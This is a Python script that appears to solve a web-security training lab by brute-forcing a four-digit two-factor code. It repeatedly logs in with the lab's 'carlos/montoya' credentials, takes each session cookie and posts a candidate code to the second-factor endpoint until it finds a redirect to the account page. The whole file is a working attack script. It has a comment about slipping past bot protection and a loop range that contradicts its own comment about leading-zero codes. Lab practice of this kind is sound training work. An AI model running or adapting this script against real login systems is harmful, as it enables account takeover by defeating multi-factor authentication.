import requests
import sys

DOMAIN = "https://0a24000404631f6e81788eb2002a000e.web-security-academy.net"
LOGIN_URL = f"{DOMAIN}/login"
_2FA_URL = f"{DOMAIN}/login2"

# surprisingly enough to pass bot protection
# in most servers ;)
GLOBAL_HEADERS = {
    "User-Agent": "Mozilla",
    "Content-Type": "application/x-www-form-urlencoded"
}

def login_get_cookie(username: str, password: str) -> str:
    # username=carlos&password=montoya
    payload = {
        "username": username,
        "password": password
    }
    # i forgot to set the "allow_redirects" param
    # which is why the login_resp had 200 OK.
    # which means it already followed the 302 Location header
    # and then printed the response
    login_resp = requests.post(url=LOGIN_URL, data=payload, headers=GLOBAL_HEADERS, allow_redirects=False)
    sc = login_resp.status_code
    if sc == 302:
        if login_resp.headers['location'] == "/login2":
            return login_resp.cookies['session']
        else:
            return "[X] '/login2' header is not found."
    else:
        return f"[X] Not 302. Status code: {sc}"
        # print(login_resp.text)

def _2fa_login(mfa_code: str, login_cookie: str) -> bool:
    # GLOBAL_HEADERS['cookie'
    # GLOBAL_HEADERS["cookie"] = "Bearer token_here"
    cookie = {
        "session": login_cookie
    }
    _2fa_payload = {
        "mfa-code": mfa_code
    }
    _2fa_login_resp = requests.post(url=_2FA_URL, data=_2fa_payload, headers=GLOBAL_HEADERS, cookies=cookie)
    # print(_2fa_login_resp.status_code)
    if _2fa_login_resp.status_code == 302 and "Incorrect security code" not in _2fa_login_resp.text:
        if "/my-account?id=" in _2fa_login_resp.headers['location']:
            return True
        else:
            return False
    else:
        return False

print("[*] Starting brute-force loop...")

try:
    for i in range(999, 9999):  # Expanded range to 0-10000 to catch codes starting with 0
        # Format index to a 4-digit padded string (e.g., 5 -> "0005")
        # mfa_code = f"{i:04d}" 
        mfa_code = i
        
        login_cookie = login_get_cookie("carlos", "montoya")
        
        # Check if we got a valid session string back instead of an error message
        if login_cookie and not login_cookie.startswith("[X]"):
            # Print feedback so you see real-time output in the terminal
            print(f"[*] Testing Code: {mfa_code} | Session: {login_cookie[:12]}...")
            
            if _2fa_login(mfa_code, login_cookie):
                print(f"\n[SUCCESS] Valid 2FA Code Found: {mfa_code}")
                break
        else:
            print(f"[-] Login failed for code {mfa_code}: {login_cookie}")

except KeyboardInterrupt:
    print(f"\n[EXIT] Program terminated by user.")
    sys.exit(0)